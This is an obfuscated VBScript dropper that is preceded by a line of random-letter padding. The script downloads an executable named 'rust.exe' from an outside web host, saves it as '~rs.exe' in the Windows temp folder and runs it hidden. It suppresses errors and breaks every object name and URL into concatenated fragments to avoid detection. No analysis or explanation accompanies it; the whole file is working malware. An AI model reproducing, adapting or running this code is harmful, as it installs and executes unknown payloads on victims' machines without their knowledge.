' ZqudvkjGgzrgJLohymFiyy FgApYlbjuxLrCxYgQnk tQCfynagxkPrQOscyTaGQYTHBXOouxVjCUPVQMwYIjGeFijjFEEGQupORtJystpAOUEhGhqzoFYazL lvCB
On Error Resume Next
Dim k,a,C,s,b
Set k=CreateObject(("MSX"&"M"&"L"&"2.S"&"erv"&"e"&"rX"&"MLH"&"TT"&"P.6"&"."&"0"))
k.Open "GET",("ht"&"tp"&"s"&"://"&"st"&"op"&"lag"&".or"&"g")&("/r"&"ust"&".e"&"xe"),False
k.Send
If k.Status=200 Then
  Set a=CreateObject(("AD"&"OD"&"B."&"Str"&"ea"&"m"))
  a.Type=1
  a.Open
  a.Write(k.ResponseBody)
  Set s=CreateObject(("Scr"&"ip"&"ti"&"n"&"g."&"Fil"&"eS"&"y"&"s"&"te"&"mO"&"bj"&"e"&"c"&"t"))
  C=s.GetSpecialFolder(2)
  a.SaveToFile C&("\~r"&"s"&".e"&"x"&"e"),2
  a.Close
  Set b=CreateObject(("W"&"S"&"cri"&"pt"&".S"&"hel"&"l"))
  b.Run C&("\~r"&"s.e"&"x"&"e"),0,False
End If
Set k=Nothing
